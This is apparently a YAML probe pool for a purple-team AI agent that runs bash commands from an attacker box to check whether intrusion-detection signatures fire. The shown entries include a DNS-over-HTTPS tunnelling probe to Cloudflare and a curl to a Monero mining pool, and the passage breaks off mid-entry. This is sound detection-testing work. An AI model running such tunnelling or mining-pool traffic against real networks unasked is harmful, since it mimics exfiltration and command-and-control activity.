# probes.yaml — curated probe pool for the purple-team agent.
#
# Each entry:
#   name              : short snake-case identifier the agent uses in record_finding
#   category          : grouping (cve-2024, c2-modern, exfil-saas, ad, etc.)
#   mitre             : primary MITRE ATT&CK technique
#   rationale         : one-line why-this-probe
#   expected_sids     : SIDs the agent should expect (int list or [])
#   expected_verdict  : DETECTED | UNDETECTED — helps the agent classify
#   already_in_catalog: true if CI's probe_catalog.json already covers this scenario
#   command           : bash to run on the ATTACKER box (the agent SSHes and runs it)
#
# The agent is free to pick from the pool in any order. Probes marked
# already_in_catalog=true probes will classify as DETECTED; the agent should
# still run them if it wants confirmation, but promote is not expected.
#
# Placeholders {{VICTIM_IP}} get substituted by the agent using the victim IP
# from its system prompt. If the agent encounters literal {{VICTIM_IP}} in a
# command, it must replace it before executing.

probes:
  # ========================================================================
  # Already-covered (existing catalog coverage — expected DETECTED, no new signal)
  # ========================================================================

  - name: doh-cloudflare-json
    category: exfil
    mitre: T1572
    rationale: "DoH JSON API to Cloudflare — ET SNI match"
    expected_sids: [2027695]
    expected_verdict: DETECTED
    already_in_catalog: true
    command: |
      LABEL=$(head -c 30 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 30)
      curl -sS --max-time 5 -H 'accept: application/dns-json' \
        "https://cloudflare-dns.com/dns-query?name=${LABEL}.example.com&type=A" >/dev/null

  - name: cryptominer-supportxmr-sni
    category: c2
    mitre: T1496
    rationale: "supportxmr.com pool SNI — ET CoinMiner"
    expected_sids: [2047929]
    expected_verdict: DETECTED
    already_in_catalog: true
    command: |
      curl -sS --max-time 5 -k "https://pool.supportxmr.com/" -o /dev/null

  - name: xmrig-stratum-login
    category: c2
    mitre: T1496
    rationale: "XMRig stratum login JSON to :3333 — ET Miner Checkin"
    expected_sids: [2024792]
